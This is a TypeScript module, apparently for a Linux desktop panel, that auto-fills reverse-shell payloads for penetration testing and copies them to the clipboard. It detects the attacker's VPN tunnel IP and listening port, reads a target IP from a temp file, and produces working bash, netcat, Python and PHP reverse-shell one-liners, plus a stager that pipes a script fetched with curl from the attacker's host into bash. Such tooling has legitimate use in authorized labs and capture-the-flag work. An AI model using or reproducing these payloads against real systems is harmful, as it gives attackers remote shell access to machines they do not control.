import { execAsync } from "ags/process";

// 1. Obtener LHOST (IP de ataque)
export async function getTunIp(): Promise<string> {
    try {
        const ip = await execAsync(['bash', '-c', "ip -o -4 addr show | grep -E 'tun[0-9]+|wg[0-9]+' | awk '{print $4}' | cut -d/ -f1 | head -n 1"]);
        return ip.trim() || (await execAsync(['bash', '-c', "hostname -I | awk '{print $1}'"])).trim();
    } catch {
        return "127.0.0.1";
    }
}

// 2. Obtener LPORT (El puerto más reciente abierto en PortMonitor)
async function getActivePort(): Promise<string> {
    try {
        // Buscamos procesos como nc, ncat, python, o ruby (msf) en escucha
        const port = await execAsync(['bash', '-c', "ss -ltnp | grep -E 'nc|ncat|python|ruby' | awk '{print $4}' | cut -d: -f2 | head -n 1"]);
        return port.trim() || "4444"; // 4444 como fallback
    } catch {
        return "4444";
    }
}

// 3. Obtener RHOST (Del archivo temporal del TargetTracker)
async function getTargetIp(): Promise<string> {
    try {
        const ip = await execAsync(['bash', '-c', "cat /tmp/target_ip 2>/dev/null"]);
        return ip.trim();
    } catch {
        return "";
    }
}

export async function copyReverseShell(type: 'bash' | 'nc' | 'python' | 'php' | 'stager') {
    const ip = await getTunIp();
    const port = await getActivePort();
    const target = await getTargetIp();
    let payload = "";

    switch (type) {
        case 'bash':
            payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            break;
        case 'nc':
            payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
            break;
        case 'python':
            payload = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
            break;
        case 'php':
            payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
            break;
        case 'stager':
            // Útil para cuando ya tienes RCE y quieres descargar algo del atacante
            payload = target 
                ? `curl http://${ip}/shell.sh | bash` 
                : `python3 -m http.server ${port}`;
            break;
    }

    await execAsync(['bash', '-c', `echo -n "${payload}" | wl-copy`]);
    
    // Notificamos para confirmar qué datos se usaron
    execAsync(['notify-send', '-a', 'OkPanel Security', `Payload ${type} Copiado`, `LHOST: ${ip}\nLPORT: ${port}`]);
}
